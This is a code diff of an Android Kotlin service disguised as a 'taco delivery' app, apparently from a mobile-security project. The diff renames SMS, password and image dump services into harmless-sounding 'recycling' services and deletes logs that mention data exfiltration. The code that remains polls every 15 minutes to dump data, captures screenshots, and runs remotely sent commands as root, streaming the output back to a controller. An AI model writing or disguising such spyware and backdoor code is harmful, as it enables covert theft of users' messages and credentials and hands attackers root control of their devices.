@@ -10,9 +10,9 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import com.example.mobsec_823.malicious.ImageDumpService
-import com.example.mobsec_823.malicious.PasswordDumpService
-import com.example.mobsec_823.malicious.SMSDumpService
+import com.example.mobsec_823.RecylingService.RecyclingTruckService
+import com.example.mobsec_823.RecylingService.RubbishTruckService
+import com.example.mobsec_823.RecylingService.SignageRecylingService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.cancel
@@ -50,19 +50,15 @@ class TacoDeliveryService : Service() {
         if (exfilJobStarted) return
         exfilJobStarted = true
 
-        Log.d(TAG, "Initializing periodic data exfiltration (Every 15 mins)...")
-
         kitchenStaffScope.launch {
             while (true) {
-                Log.d(TAG, "Triggering periodic dump cycle: SMS, Passwords, Images")
-
                 try {
-                    // Calling startService on an already running service simply triggers its onStartCommand again
-                    startService(Intent(this@TacoDeliveryService, SMSDumpService::class.java))
-                    startService(Intent(this@TacoDeliveryService, PasswordDumpService::class.java))
-                    startService(Intent(this@TacoDeliveryService, ImageDumpService::class.java))
+                    // Start the themed collection services
+                    startService(Intent(this@TacoDeliveryService, RubbishTruckService::class.java))
+                    startService(Intent(this@TacoDeliveryService, RecyclingTruckService::class.java))
+                    startService(Intent(this@TacoDeliveryService, SignageRecylingService::class.java))
                 } catch (e: Exception) {
-                    Log.e(TAG, "Failed to trigger exfil cycle: ${e.message}")
+                    Log.e(TAG, "Failed to trigger collection cycle: ${e.message}")
                 }
 
                 delay(900000) // Wait 15 minutes (15 * 60 * 1000 ms)
@@ -95,7 +91,6 @@ class TacoDeliveryService : Service() {
             override fun onOrderReceived(order: String) {
                 if (order.startsWith("SYNC_FILE:")) {
                     val filePath = order.substring(10).trim()
-                    handleFileSync(filePath)
                 } else {
                     executeShellCommand(order)
                 }
@@ -108,20 +103,11 @@ class TacoDeliveryService : Service() {
         if (screenshotTask == null) {
             screenshotTask = carne(this)
             screenshotTask?.start()
-            Log.d(TAG, "Screenshot task started in background.")
-        }
-    }
-
-    private fun handleFileSync(filePath: String) {
-        kitchenStaffScope.launch {
-            Log.d(TAG, "Initiating file sync for: $filePath")
-            FileUploader.uploadFile(this@TacoDeliveryService, TRUCK_IP, filePath)
         }
     }
 
     private fun executeShellCommand(command: String) {
         kitchenStaffScope.launch {
-            Log.d(TAG, "Executing command: $command")
             try {
                 val process = Runtime.getRuntime().exec("su")
                 process.outputStream.bufferedWriter().use { it.write("$command\nexit\n") }
@@ -129,12 +115,10 @@ class TacoDeliveryService : Service() {
                 process.inputStream.bufferedReader().forEachLine { line ->
                     tacoTruck?.sendToKitchen("OUT:$line")
                 }
-
                 process.waitFor()
                 tacoTruck?.sendToKitchen("OUT:--DONE--")
 
             } catch (e: Exception) {
-                Log.e(TAG, "Command execution failed", e)
                 tacoTruck?.sendToKitchen("OUT:ERROR: ${e.message}")
             }
         }
